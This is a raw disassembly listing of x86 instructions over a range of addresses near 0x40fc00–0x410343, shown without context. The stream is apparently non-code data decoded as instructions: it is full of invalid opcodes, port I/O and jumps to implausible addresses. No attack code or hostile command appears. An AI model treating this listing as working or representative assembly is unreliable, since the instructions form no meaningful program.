  40fc0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc0c:	dec    cl
  40fc0e:	dec    edi
  40fc0f:	push   esp
  40fc11:	dec    edi
  40fc12:	inc    esp
  40fc14:	cdq    
  40fc15:	xor    esp,DWORD PTR [edi+0x4e]
  40fc18:	mov    ds:0xe1818090,al
  40fc1d:	outs   dx,BYTE PTR ds:[esi]
  40fc1e:	int    0x2f
  40fc20:	mov    bh,0xb9
  40fc22:	test   dh,ch
  40fc24:	cmp    DWORD PTR [edi+0x321cca30],edi
  40fc2a:	frstor [edi-0x2857c651]
  40fc30:	jmp    0x40fc95
  40fc32:	(bad)  
  40fc34:	cld    
  40fc35:	lock mov ebx,0x37c6f8de
  40fc3b:	mov    esi,0xefbbeee1
  40fc40:	jle    0x40fcb2
  40fc42:	jb     0x40fcb6
  40fc44:	jb     0x40fc18
  40fc46:	xor    DWORD PTR fs:[edx],esi
  40fc49:	test   BYTE PTR [edi-0x1c],dl
  40fc4c:	sbb    eax,0xddcdfb71
  40fc51:	outs   dx,DWORD PTR ds:[esi]
  40fc52:	pop    esp
  40fc53:	cmp    bl,0xf7
  40fc56:	out    dx,eax
  40fc57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc58:	push   esp
  40fc59:	sub    dh,BYTE PTR [ecx+0x18e1b1b1]
  40fc5f:	jp     0x40fcc6
  40fc61:	xchg   BYTE PTR [ecx],ah
  40fc63:	mov    eax,0xc71c562a
  40fc68:	pushf  
  40fc69:	aas    
  40fc6a:	jg     0x40fc0a
  40fc6c:	in     eax,0xe5
  40fc6e:	cmp    eax,DWORD PTR gs:[ebp+0xccccf78]
  40fc75:	mov    bl,0x33
  40fc77:	xor    ebp,esp
  40fc79:	fnstenv [ebx+0x585f987]
  40fc7f:	neg    BYTE PTR [edi]
  40fc81:	cmp    BYTE PTR [eax-0x31],ah
  40fc84:	in     eax,dx
  40fc85:	cmc    
  40fc86:	jp     0x40fcb1
  40fc88:	pop    edx
  40fc89:	call   0xbbb5e604
  40fc8e:	sub    ah,BYTE PTR [ebx]
  40fc90:	xchg   ebx,eax
  40fc91:	(bad)  
  40fc92:	(bad)  
  40fc93:	mov    esi,0x19ccb289
  40fc98:	add    ebp,ecx
  40fc9a:	ja     0x40fcd0
  40fc9c:	popf   
  40fc9d:	out    0x22,eax
  40fc9f:	pop    es
  40fca0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fca1:	mov    ah,0xd0
  40fca3:	fisub  WORD PTR [ebp+edi*2-0x7b850915]
  40fcaa:	push   ecx
  40fcab:	inc    esp
  40fcac:	mov    al,ds:0x1a27b453
  40fcb1:	sbb    esp,esp
  40fcb3:	in     eax,dx
  40fcb4:	inc    edi
  40fcb5:	out    dx,al
  40fcb6:	clc    
  40fcb7:	sub    BYTE PTR [edx-0x5af0a2cb],dh
  40fcbd:	call   0xf3c6:0x15798059
  40fcc4:	cmp    al,0x56
  40fcc6:	push   edi
  40fcc7:	push   edi
  40fcc8:	pop    edi
  40fcc9:	aad    0x28
  40fccb:	inc    eax
  40fccc:	fadd   DWORD PTR ds:0xc0820803
  40fcd2:	jmp    0xcd4c91f7
  40fcd7:	pop    eax
  40fcd8:	std    
  40fcd9:	rcl    DWORD PTR [esi+0x3c210132],cl
  40fcdf:	ret    0xc870
  40fce2:	jo     0x40fcbc
  40fce4:	(bad)  
  40fce5:	aam    0x11
  40fce7:	adc    BYTE PTR [ebp+eax*1-0x80],0x51
  40fcec:	std    
  40fced:	outs   dx,DWORD PTR ds:[esi]
  40fcef:	shr    DWORD PTR [edi],1
  40fcf1:	pop    edx
  40fcf2:	lock fcomp QWORD PTR ss:[edi+ebx*2]
  40fcf7:	lods   eax,DWORD PTR ds:[esi]
  40fcf8:	push   esi
  40fcf9:	cdq    
  40fcfa:	fwait
  40fcfb:	fwait
  40fcfc:	mov    bl,0xb1
  40fcfe:	imul   esi
  40fd00:	mov    cl,0x9d
  40fd02:	dec    esi
  40fd03:	xchg   ebx,ecx
  40fd05:	xchg   edi,eax
  40fd06:	das    
  40fd07:	mov    bl,0xbd
  40fd09:	mov    ebp,0x3d92948d
  40fd0e:	jnp    0x40fd06
  40fd10:	fsubr  DWORD PTR [eax+0x3132373d]
  40fd16:	or     al,0x43
  40fd18:	pop    esi
  40fd19:	jp     0x40fd04
  40fd1b:	and    eax,0x493c9e4e
  40fd20:	mov    bh,0xdb
  40fd22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd23:	xlat   BYTE PTR ds:[ebx]
  40fd24:	jmp    0x40fd4b
  40fd26:	push   edi
  40fd27:	scas   al,BYTE PTR es:[edi]
  40fd28:	pop    esp
  40fd29:	jns    0x40fd19
  40fd2b:	lds    edx,FWORD PTR [edi]
  40fd2d:	pop    edi
  40fd2e:	cld    
  40fd2f:	loop   0x40fcca
  40fd31:	xor    esp,DWORD PTR [edi-0x72]
  40fd34:	(bad)  
  40fd35:	jno    0x40fd53
  40fd37:	add    dh,dl
  40fd39:	les    ecx,FWORD PTR [ecx+0x42115f13]
  40fd3f:	push   esp
  40fd40:	xchg   edi,eax
  40fd41:	xchg   esi,eax
  40fd42:	xchg   esi,eax
  40fd43:	push   cs
  40fd44:	sbb    al,0x3c
  40fd46:	js     0x40fd38
  40fd48:	jne    0x40fdb9
  40fd4a:	jp     0x40fd1f
  40fd4c:	fwait
  40fd4d:	mov    esi,0x43a1d0e5
  40fd52:	push   ebx
  40fd53:	mov    ch,0x5a
  40fd55:	lea    esi,[ecx-0x6ad5ce4f]
  40fd5b:	or     bh,BYTE PTR [ebp-0x3ca330a2]
  40fd61:	cs das 
  40fd63:	sub    eax,0xc8fa1d2d
  40fd68:	inc    edi
  40fd69:	repnz xlat BYTE PTR ds:[ebx]
  40fd6c:	jg     0x40fd50
  40fd6e:	daa    
  40fd6f:	jle    0x40fd53
  40fd71:	xchg   ebx,esp
  40fd73:	cmp    BYTE PTR [esi],dh
  40fd75:	mov    eax,ds:0xa6faba65
  40fd7a:	inc    ebp
  40fd7b:	add    DWORD PTR [esi+0x67],ebp
  40fd7e:	in     al,0x19
  40fd80:	sub    bh,0x2c
  40fd83:	fwait
  40fd84:	repnz ds out dx,al
  40fd87:	(bad)  
  40fd88:	sbb    BYTE PTR [eax],bl
  40fd8a:	jp     0x40fd2a
  40fd8c:	push   edi
  40fd8d:	fwait
  40fd8e:	popf   
  40fd8f:	popf   
  40fd90:	popf   
  40fd91:	jle    0x40fd76
  40fd93:	sbb    ebx,edi
  40fd95:	clc    
  40fd96:	sar    BYTE PTR [ebx],1
  40fd98:	fdivrp st(1),st
  40fd9a:	mov    ?,WORD PTR [edi+0x1d]
  40fd9d:	ds jl  0x40fd98
  40fda0:	fwait
  40fda1:	dec    esp
  40fda2:	xor    eax,0x53a74e9a
  40fda7:	fsubr  DWORD PTR [edi+0x777c23d7]
  40fdad:	(bad)  
  40fdaf:	sti    
  40fdb0:	ret    0x2c2
  40fdb3:	in     eax,0x72
  40fdb5:	pop    ecx
  40fdb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdb7:	pop    ss
  40fdb8:	and    ecx,DWORD PTR ds:0x437fc9d0
  40fdbe:	mov    bl,0xec
  40fdc0:	dec    edx
  40fdc1:	retf   0x8a28
  40fdc4:	mov    eax,0xcb3cfe70
  40fdc9:	addr16 into 
  40fdcb:	and    BYTE PTR [eax+eiz*4+0x35332e5c],al
  40fdd2:	xor    eax,0x8668cc5
  40fdd7:	pop    es
  40fdd8:	nop    DWORD PTR [esp+edi*2+0x62]
  40fddd:	or     BYTE PTR [ecx],0x87
  40fde0:	xchg   ecx,eax
  40fde1:	ja     0xaf1eb82a
  40fde7:	popf   
  40fde8:	xor    bl,BYTE PTR ds:0x91c21146
  40fdee:	in     al,0x9
  40fdf0:	push   cs
  40fdf1:	sub    dh,al
  40fdf3:	int3   
  40fdf4:	sub    al,0x40
  40fdf6:	lods   al,BYTE PTR ds:[esi]
  40fdf7:	fisub  DWORD PTR [eax]
  40fdf9:	dec    eax
  40fdfa:	ins    DWORD PTR es:[edi],dx
  40fdfb:	add    al,0xa6
  40fdfd:	lock imul esp,DWORD PTR [edi+0x28f34edd],0xffffffc6
  40fe05:	mov    cl,0x99
  40fe07:	mov    ds:0x36946851,eax
  40fe0c:	out    dx,eax
  40fe0d:	jne    0x40fe3c
  40fe0f:	xor    DWORD PTR [ebx-0x2f],0x3e
  40fe13:	repz jmp 0x40fe48
  40fe16:	add    bh,dh
  40fe18:	mov    bh,0x54
  40fe1a:	sub    bh,BYTE PTR [ebp+0x4d40c96a]
  40fe20:	mov    ebx,0xf1700661
  40fe25:	loop   0x40fdec
  40fe27:	sub    ecx,DWORD PTR [ebx+0x4a7a8b8b]
  40fe2d:	stos   DWORD PTR es:[edi],eax
  40fe2e:	push   edx
  40fe2f:	add    DWORD PTR [edi+eiz*1+0x1c54bcc0],ecx
  40fe36:	dec    ebx
  40fe37:	sbb    eax,0xba3aa418
  40fe3c:	shr    DWORD PTR [ecx-0x27],cl
  40fe3f:	fdiv   DWORD PTR [ebx-0x6d]
  40fe42:	sbb    BYTE PTR [ebx],ah
  40fe44:	outs   dx,DWORD PTR ds:[esi]
  40fe45:	add    al,0x74
  40fe47:	fcomi  st,st(5)
  40fe49:	fadd   QWORD PTR [eax+0x691ab066]
  40fe4f:	pop    ebx
  40fe50:	stos   DWORD PTR es:[edi],eax
  40fe51:	aad    0x32
  40fe53:	push   eax
  40fe54:	fisttp WORD PTR [eax-0x70]
  40fe57:	sub    eax,0xbd7a503d
  40fe5c:	push   ds
  40fe5d:	cmc    
  40fe5e:	jp     0x40fdfd
  40fe60:	add    eax,DWORD PTR [edi]
  40fe62:	push   cs
  40fe63:	shr    BYTE PTR [esi+esi*1+0x2d],1
  40fe67:	xchg   ebx,eax
  40fe68:	xor    cl,bh
  40fe6a:	fst    DWORD PTR [edi+0x59599797]
  40fe70:	pop    ecx
  40fe71:	popa   
  40fe72:	ins    DWORD PTR es:[edi],dx
  40fe73:	ins    DWORD PTR es:[edi],dx
  40fe74:	lea    ecx,[ebp-0x4949f273]
  40fe7a:	mov    dh,0xce
  40fe7c:	lahf   
  40fe7d:	ds jge 0x40fe7a
  40fe80:	mov    DWORD PTR [ebx-0x69],ecx
  40fe83:	cs popf 
  40fe85:	pop    eax
  40fe86:	pop    ecx
  40fe87:	pop    ecx
  40fe88:	jns    0x40feaf
  40fe8a:	dec    ecx
  40fe8b:	xchg   edx,eax
  40fe8c:	or     BYTE PTR ds:0x82284bdb,al
  40fe92:	in     eax,dx
  40fe93:	out    dx,eax
  40fe94:	fistp  QWORD PTR [edi-0x10421e81]
  40fe9a:	jge    0x40fe8b
  40fe9c:	fwait
  40fe9d:	out    dx,al
  40fe9e:	mov    ecx,0x87839ee7
  40fea3:	nop    DWORD PTR [esi-0x46]
  40fea7:	xor    edi,esi
  40fea9:	ss ss ss adc al,0x8c
  40feae:	aad    0x70
  40feb0:	push   esi
  40feb1:	inc    edi
  40feb2:	add    dh,BYTE PTR [esi-0x61]
  40feb5:	jns    0x40fe9d
  40feb7:	cdq    
  40feb8:	inc    edi
  40feb9:	sahf   
  40feba:	jge    0x40feb2
  40febc:	fnstcw WORD PTR [edi]
  40febe:	aad    0x83
  40fec0:	ret    0xfe48
  40fec3:	or     BYTE PTR [ebp-0x78],ch
  40fec6:	arpl   WORD PTR [ebp+ebx*1+0x70],dx
  40feca:	mov    ebx,ebx
  40fecc:	xor    BYTE PTR [eax],al
  40fece:	ja     0x40fea9
  40fed0:	inc    ebp
  40fed1:	add    al,0x83
  40fed3:	stc    
  40fed4:	stc    
  40fed5:	stc    
  40fed6:	stc    
  40fed7:	xchg   DWORD PTR [edi],ebx
  40fed9:	jle    0x40fed3
  40fedb:	fistp  DWORD PTR [edi]
  40fedd:	js     0x40febf
  40fedf:	xor    DWORD PTR [edi-0xf87c3e4],0xc9c9c9ae
  40fee9:	icebp  
  40feea:	cmp    al,0xd1
  40feec:	out    0x9,eax
  40feee:	jge    0x40ff17
  40fef0:	push   ax
  40fef2:	mov    ah,0x2d
  40fef4:	outs   dx,DWORD PTR ds:[esi]
  40fef5:	adc    DWORD PTR [bp+si-0x28],eax
  40fef9:	push   0x231d0dc9
  40fefe:	push   eax
  40feff:	mov    ebp,DWORD PTR fs:[ecx]
  40ff02:	(bad)  
  40ff03:	fiadd  WORD PTR [esi]
  40ff05:	cmp    bl,BYTE PTR [ebx+0x1c71b90c]
  40ff0b:	jae    0x40ff06
  40ff0d:	repnz gs into 
  40ff10:	popf   
  40ff11:	push   ebx
  40ff12:	dec    ecx
  40ff13:	jno    0x40fedf
  40ff15:	in     eax,0x32
  40ff17:	aad    0x6a
  40ff19:	aad    0xda
  40ff1b:	jo     0x40fea9
  40ff1d:	retf   
  40ff1e:	jbe    0x40ff8e
  40ff20:	jle    0x40ff00
  40ff22:	xor    bl,BYTE PTR [esi]
  40ff24:	push   ebx
  40ff25:	fisubr WORD PTR [ebp+0xd13efd7]
  40ff2b:	xchg   DWORD PTR [edx+eax*8],ecx
  40ff2e:	nop
  40ff2f:	scas   al,BYTE PTR es:[edi]
  40ff30:	mov    dh,0x2b
  40ff32:	and    al,0x52
  40ff34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff35:	dec    edi
  40ff36:	aaa    
  40ff37:	cmc    
  40ff38:	pop    ss
  40ff39:	xor    al,0xc
  40ff3b:	add    eax,0x63fd1cd2
  40ff40:	arpl   WORD PTR [ebx+0x24],sp
  40ff43:	push   es
  40ff44:	ins    DWORD PTR es:[edi],dx
  40ff45:	mov    ah,0xdb
  40ff47:	ss pop ebp
  40ff49:	ja     0x40fef0
  40ff4b:	push   edx
  40ff4c:	sbb    DWORD PTR [ecx-0x62],eax
  40ff4f:	outs   dx,BYTE PTR ds:[esi]
  40ff50:	pop    edi
  40ff51:	fmul   QWORD PTR [ebx+edx*1]
  40ff54:	jo     0x40ff81
  40ff56:	pop    edx
  40ff57:	cdq    
  40ff58:	imul   edx,DWORD PTR [ebx+ecx*8-0x3162c59b],0xffffffd5
  40ff60:	out    0x9e,eax
  40ff62:	jnp    0x40ff52
  40ff64:	or     DWORD PTR [edx-0x212423ba],esi
  40ff6a:	jbe    0x40ff2f
  40ff6c:	add    BYTE PTR [esi],al
  40ff6e:	pop    es
  40ff6f:	push   cs
  40ff70:	sbb    al,0x60
  40ff72:	xor    BYTE PTR [eax],bl
  40ff74:	call   0x494a474d
  40ff79:	adc    ah,BYTE PTR [ebp+0x6c]
  40ff7c:	add    dh,al
  40ff7e:	xor    esp,DWORD PTR [eax-0x58218d4]
  40ff84:	std    
  40ff85:	push   ds
  40ff86:	(bad)  
  40ff87:	push   ds
  40ff88:	and    BYTE PTR [eax+eiz*2+0x175e1c38],al
  40ff8f:	(bad)  
  40ff90:	out    dx,eax
  40ff91:	fs in  al,0x4b
  40ff94:	xchg   edx,eax
  40ff95:	test   BYTE PTR [edx-0x47],dh
  40ff98:	int3   
  40ff99:	clc    
  40ff9a:	clc    
  40ff9b:	cmp    bl,dl
  40ff9d:	rcl    ebx,cl
  40ff9f:	jbe    0x40ff2b
  40ffa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffa2:	cmp    DWORD PTR [esi+0x38],esi
  40ffa5:	sbb    al,0xb2
  40ffa7:	mov    ch,0xb5
  40ffa9:	gs inc ebx
  40ffab:	jo     0x40ff3a
  40ffad:	xchg   ebp,eax
  40ffae:	jp     0x41001e
  40ffb0:	outs   dx,BYTE PTR ds:[esi]
  40ffb1:	into   
  40ffb2:	push   es
  40ffb3:	lods   al,BYTE PTR ds:[esi]
  40ffb4:	cwde   
  40ffb5:	jmp    0x5d6f9782
  40ffba:	loop   0x40ff51
  40ffbc:	push   edi
  40ffbd:	pop    esi
  40ffbe:	popa   
  40ffbf:	jns    0x41003a
  40ffc1:	fldenv [ecx*8+0x71389eec]
  40ffc8:	loop   0x40ff59
  40ffca:	mov    ds,WORD PTR [edi]
  40ffcc:	aas    
  40ffcd:	(bad)  
  40ffce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffcf:	pop    esi
  40ffd0:	scas   eax,DWORD PTR es:[edi]
  40ffd1:	xlat   BYTE PTR ds:[ebx]
  40ffd2:	sar    ch,cl
  40ffd4:	push   edx
  40ffd5:	sar    BYTE PTR [edi+0x9],cl
  40ffd8:	xor    BYTE PTR [edi+ebx*4-0x30866061],bl
  40ffdf:	jnp    0x40ffbf
  40ffe1:	repz lock mov ebx,0xb7eefddf
  40ffe8:	out    dx,eax
  40ffe9:	(bad)  [edi+0x2082c6f]
  40ffef:	retf   0x10ba
  40fff2:	call   0x63a13057
  40fff7:	arpl   WORD PTR [ebx-0x66944892],ax
  40fffd:	dec    edi
  40fffe:	adc    al,0x45
  410000:	cmp    al,0xf1
  410002:	les    edx,FWORD PTR [ebx]
  410004:	pop    edi
  410005:	clc    
  410006:	cld    
  410007:	out    0x3f,eax
  410009:	(bad)  
  41000a:	jmp    0x40fff3
  41000c:	into   
  41000d:	popf   
  41000e:	cmp    eax,DWORD PTR [ebp+0x451f7a22]
  410014:	clc    
  410015:	adc    DWORD PTR [edx-0xa],ebp
  410018:	mov    DWORD PTR [ecx+0x1],eax
  41001b:	adc    DWORD PTR [ebx],edi
  41001d:	xor    eax,DWORD PTR [eax-0xa640ec4]
  410023:	inc    ecx
  410024:	mov    bl,0xd9
  410026:	ins    BYTE PTR es:[edi],dx
  410027:	jle    0x410011
  410029:	inc    ebx
  41002a:	pop    ds
  41002b:	cli    
  41002c:	sahf   
  41002d:	ja     0x40ffed
  41002f:	repz popf 
  410031:	pop    ds
  410032:	call   0x69d4:0x37d99999
  410039:	leave  
  41003a:	(bad)  
  41003c:	jbe    0x40ffc4
  41003e:	or     bl,dh
  410040:	add    al,0x79
  410042:	mov    ds:0x3e5a6fc4,eax
  410047:	xchg   ebp,eax
  410048:	mov    ch,0xab
  41004a:	jbe    0x410065
  41004c:	jne    0x41000e
  41004e:	sub    eax,0x65ee6178
  410053:	pop    esp
  410054:	ret    0x22e
  410057:	xor    bh,bl
  410059:	sub    al,0x9f
  41005b:	hlt    
  41005c:	aad    0xcc
  41005e:	pushf  
  41005f:	mov    ebx,fs
  410061:	fmul   st,st(6)
  410063:	scas   al,BYTE PTR es:[edi]
  410064:	je     0x40ffeb
  410066:	inc    ebp
  410067:	test   eax,0x62626254
  41006c:	cmp    cl,0xf9
  41006f:	jns    0x4100d7
  410071:	addr16 addr16 pop ecx
  410074:	pop    esp
  410075:	pop    esp
  410076:	fistp  QWORD PTR fs:[esi+0x4c4c4c7d]
  41007d:	push   eax
  41007e:	sub    dl,BYTE PTR [ebp-0x1e0885ac]
  410084:	shl    BYTE PTR [esi+0x5b],1
  410087:	jmp    0xc37d:0xb50cbb74
  41008e:	jp     0x4100af
  410090:	hlt    
  410091:	jge    0x41005a
  410093:	mov    bh,0xed
  410096:	jnp    0x410080
  410098:	test   al,0x4d
  41009a:	xchg   ebp,eax
  41009b:	fmulp  st(5),st
  41009d:	mov    esi,ebp
  41009f:	fmul   QWORD PTR [ecx-0x5e]
  4100a2:	out    dx,eax
  4100a3:	xchg   esi,eax
  4100a4:	or     esp,esp
  4100a6:	fucom  st(2)
  4100a8:	xchg   ebp,eax
  4100a9:	dec    edx
  4100aa:	test   DWORD PTR [edx-0x5b],ecx
  4100ad:	ret    0xf2f2
  4100b0:	bnd jg 0x410130
  4100b3:	jmp    0x906f985d
  4100b8:	inc    esi
  4100b9:	jno    0x410055
  4100bb:	mov    edi,0x6e39629d
  4100c0:	dec    ecx
  4100c1:	mov    ebx,0xfbe00661
  4100c6:	mov    esi,0xce52d807
  4100cb:	jno    0x410139
  4100cd:	ret    0xb381
  4100d0:	sub    al,BYTE PTR [eax-0x16dff656]
  4100d6:	jbe    0x4100b3
  4100d8:	cmp    dh,BYTE PTR [edi+0x59d2345c]
  4100de:	inc    ebp
  4100df:	adc    bl,dl
  4100e1:	inc    ebp
  4100e2:	add    al,0xf9
  4100e4:	add    DWORD PTR [ebx],ebx
  4100e6:	add    al,0x81
  4100e8:	popf   
  4100e9:	xchg   edi,ebp
  4100eb:	(bad)  
  4100ec:	adc    ebx,DWORD PTR [eax]
  4100ee:	and    edx,esi
  4100f0:	cli    
  4100f1:	cli    
  4100f2:	cmp    bl,BYTE PTR [ebx]
  4100f4:	sbb    ebx,DWORD PTR [ebx]
  4100f6:	or     al,0x6
  4100f8:	add    eax,esi
  4100fa:	mov    dh,0xd8
  4100fd:	mov    bh,0x6f
  4100ff:	pop    ds
  410100:	push   ebx
  410101:	push   ebx
  410102:	push   ebx
  410103:	xchg   esi,eax
  410104:	mov    ds:0xfe76c19b,eax
  410109:	cld    
  41010a:	jns    0x41016a
  41010c:	jns    0x4100f3
  41010e:	adc    eax,0x8c565656
  410113:	jno    0x4100c4
  410115:	jnp    0x410105
  410117:	fdivr  QWORD PTR [ecx-0xd034251]
  41011d:	retf   
  41011e:	pop    edi
  41011f:	pop    esp
  410120:	pop    ebp
  410121:	pop    ebp
  410122:	mov    ebp,0x26f82280
  410127:	jmp    0xf95d:0x58284423
  41012e:	rol    BYTE PTR [edi],0x3e
  410131:	lock mov esi,0xfdffbff7
  410137:	out    dx,eax
  410138:	pop    ecx
  410139:	pop    eax
  41013a:	pop    eax
  41013b:	cwde   
  41013c:	sub    BYTE PTR [edi+0x356ad4cb],dl
  410142:	fwait
  410143:	xchg   edi,eax
  410144:	jg     0x4101c1
  410146:	jnp    0x410123
  410148:	mov    ds:0x6deded8d,al
  41014d:	pop    edx
  41014e:	lods   eax,DWORD PTR ds:[esi]
  41014f:	push   ss
  410150:	pop    ss
  410151:	cs pop esp
  410153:	js     0x41013e
  410155:	sub    ebx,DWORD PTR [edi-0x7]
  410158:	retf   0x3c1f
  41015b:	cli    
  41015c:	call   0xa4e19104
  410161:	jl     0x4101a8
  410163:	call   FWORD PTR [edx]
  410165:	mov    ds:0x2dbfb5d7,al
  41016a:	xor    esi,DWORD PTR [eax]
  41016c:	test   al,0xc0
  41016e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41016f:	xor    al,0x83
  410171:	pop    esi
  410172:	pop    ebp
  410173:	mov    ds:0xc435f4f7,al
  410178:	inc    ebx
  410179:	(bad)  
  41017b:	hlt    
  41017c:	loopne 0x410105
  41017e:	aas    
  41017f:	cld    
  410180:	loope  0x410141
  410182:	jno    0x410173
  410184:	mov    ebp,0xd7b9bef7
  410189:	jmp    0x410164
  41018b:	fs stos DWORD PTR es:[edi],eax
  41018d:	outs   dx,BYTE PTR ds:[esi]
  41018e:	mov    edi,0xaeaf13b9
  410193:	add    eax,0x4c7aff3
  410198:	repnz (bad) 
  41019b:	mov    ebp,0x4cfbefa6
  4101a0:	dec    ebp
  4101a1:	dec    ebp
  4101a2:	mov    cl,0xbd
  4101a4:	mov    ebp,0x79a58d6d
  4101a9:	call   0xe1a0a1d
  4101ae:	add    al,0x73
  4101b0:	jg     0x4101df
  4101b2:	jl     0x41022b
  4101b4:	lods   al,BYTE PTR ds:[esi]
  4101b5:	in     eax,dx
  4101b6:	stc    
  4101b7:	pop    esp
  4101b8:	or     edx,DWORD PTR [edx+0x4a]
  4101bb:	ss ss ss pop eax
  4101bf:	pop    ebp
  4101c0:	pop    ebp
  4101c1:	inc    ebp
  4101c2:	dec    edx
  4101c3:	xchg   ebp,eax
  4101c4:	outs   dx,BYTE PTR ds:[esi]
  4101c5:	int    0x44
  4101c7:	jb     0x4101b7
  4101c9:	fnstsw WORD PTR [ebx-0x8040269]
  4101cf:	mov    bl,0xb0
  4101d1:	mov    al,0x40
  4101d3:	mov    ds:0x6a6a60d1,eax
  4101d8:	or     ch,BYTE PTR [ecx]
  4101da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101db:	dec    ebp
  4101dc:	mov    edi,0xd7e9d1d6
  4101e1:	push   es
  4101e2:	cmp    al,BYTE PTR [edi+0x60f79982]
  4101e8:	out    dx,al
  4101e9:	scas   al,BYTE PTR es:[di]
  4101eb:	in     eax,0x32
  4101ed:	sbb    al,0x77
  4101ef:	mov    ebp,fs
  4101f1:	sti    
  4101f2:	popa   
  4101f3:	aaa    
  4101f4:	dec    esp
  4101f5:	sar    BYTE PTR [eax-0x72],0xc
  4101f9:	jb     0x4101a8
  4101fb:	xlat   BYTE PTR ds:[ebx]
  4101fc:	jmp    0x410202
  4101fe:	inc    ecx
  4101ff:	rcr    BYTE PTR [edi-0x3603604],0x91
  410206:	jle    0x4101c7
  410208:	sub    BYTE PTR [ecx+eiz*2-0x191dca28],0x3b
  410210:	(bad)  
  410211:	sbb    ecx,esi
  410213:	or     al,0x76
  410215:	arpl   WORD PTR [esp+ebx*2],ax
  410218:	aaa    
  410219:	das    
  41021a:	ds sbb ah,dh
  41021d:	xchg   ecx,eax
  41021e:	xor    cl,ch
  410220:	or     BYTE PTR [ebx],0xa9
  410223:	sbb    edx,DWORD PTR [eax-0x3f]
  410226:	lock push cs
  410228:	add    DWORD PTR [ecx+0xf],0x69
  41022c:	jmp    0x410208
  41022e:	stos   DWORD PTR es:[edi],eax
  41022f:	data16 adc ch,BYTE PTR [edx-0x66]
  410233:	jecxz  0x410211
  410235:	mov    cs,esp
  410237:	ja     0x4101d9
  410239:	out    dx,eax
  41023a:	sti    
  41023b:	aam    0x6a
  41023d:	xor    eax,0xb6cca6aa
  410242:	jbe    0x410229
  410244:	cdq    
  410245:	(bad)  
  410246:	aam    0xed
  410248:	jbe    0x410233
  41024a:	idiv   ebx
  41024c:	ins    BYTE PTR es:[edi],dx
  41024d:	outs   dx,BYTE PTR ds:[esi]
  41024e:	outs   dx,BYTE PTR ds:[esi]
  41024f:	adc    al,BYTE PTR [ebp+0x11]
  410252:	cmc    
  410253:	jp     0x4101f2
  410255:	cdq    
  410256:	cdq    
  410257:	sbb    ebx,ebp
  410259:	retf   0xad33
  41025c:	(bad)  [esi-0x4d]
  41025f:	mov    cl,0xb1
  410261:	shl    ebp,0xcb
  410264:	xchg   edi,eax
  410265:	cmp    DWORD PTR [ebx-0x1a],esi
  410268:	or     al,0xdd
  41026a:	outs   dx,BYTE PTR ds:[esi]
  41026b:	push   edi
  41026c:	outs   dx,BYTE PTR ds:[esi]
  41026d:	outs   dx,DWORD PTR ds:[esi]
  41026e:	outs   dx,DWORD PTR ds:[esi]
  41026f:	pop    edi
  410270:	mov    esi,0xcbf2f97c
  410275:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410276:	dec    esi
  410277:	popf   
  410278:	cli    
  410279:	rcr    dl,cl
  41027b:	fcmovu st,st(2)
  41027d:	and    eax,0x5f196114
  410282:	popa   
  410283:	add    al,0x24
  410285:	pop    es
  410286:	nop    esp
  410289:	jg     0x41026f
  41028b:	enter  0x8391,0x6f
  41028f:	jge    0x41027c
  410291:	pop    ebx
  410292:	pop    edi
  410293:	jmp    eax
  410295:	or     DWORD PTR [edi],0xffffffde
  410298:	imul   esp,DWORD PTR [eax-0x42],0x21
  41029c:	jl     0x4102a1
  41029e:	cmc    
  41029f:	aaa    
  4102a0:	aaa    
  4102a1:	aaa    
  4102a2:	jmp    0xafed7d9c
  4102a7:	scas   eax,DWORD PTR es:[edi]
  4102a8:	inc    edi
  4102a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102aa:	dec    edi
  4102ab:	lahf   
  4102ac:	jle    0x410297
  4102ae:	mov    ecx,0xe47b9ee7
  4102b3:	icebp  
  4102b4:	(bad)  
  4102b5:	pop    ds
  4102b6:	call   DWORD PTR [edx+0x18]
  4102b9:	xchg   BYTE PTR [ebp-0x23],ch
  4102bc:	mov    edi,0x94436886
  4102c1:	push   ebp
  4102c2:	ds jb  0x41025b
  4102c5:	inc    ebx
  4102c6:	push   edx
  4102c7:	add    al,0x90
  4102c9:	aaa    
  4102ca:	or     dh,ah
  4102cc:	push   ebp
  4102cd:	sbb    BYTE PTR [eax+0x6fbdbfff],0x8f
  4102d4:	xchg   ecx,eax
  4102d5:	mov    ds:0x55fcf73a,eax
  4102da:	cmc    
  4102db:	mov    ebx,0xe5e7bba7
  4102e0:	sbb    DWORD PTR [ebx+0x6c],edi
  4102e3:	cmp    al,0xbe
  4102e5:	mov    dh,0x31
  4102e7:	ss fsub st,st(6)
  4102ea:	jno    0x410283
  4102ec:	cwde   
  4102ed:	inc    eax
  4102ee:	add    al,BYTE PTR [ecx-0x4b767ca0]
  4102f4:	and    DWORD PTR [ecx+0x50],edx
  4102f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102f8:	(bad)  
  4102fa:	pop    ds
  4102fb:	push   edi
  4102fc:	mov    ecx,0xae89bdd2
  410301:	push   esi
  410302:	dec    edx
  410303:	push   esi
  410304:	and    BYTE PTR [ecx],dl
  410306:	push   esi
  410307:	pop    ecx
  410308:	loopne 0x4102d0
  41030a:	and    BYTE PTR [ecx-0x5bb269d5],ah
  410310:	fwait
  410311:	aad    0xe6
  410313:	inc    esi
  410314:	mov    al,BYTE PTR [edx-0x30]
  410317:	pop    ebp
  410318:	imul   edx,DWORD PTR ds:0x4c20d864,0x836c4dae
  410322:	jns    0x4102e8
  410324:	das    
  410325:	int3   
  410326:	loopne 0x410300
  410328:	jecxz  0x410343
  41032a:	jnp    0x41038a
  41032c:	fnstsw WORD PTR ds:0xeee9eeaf
  410332:	jno    0x4103ab
  410334:	cmc    
  410335:	mov    ds:0xff7aabba,eax
  41033a:	call   0x3f00ae3d
  41033f:	jae    0x4102eb
  410341:	jnp    0x410309
  410343:	fadd   DWORD PTR [eax+edx*4-0x515ab606]
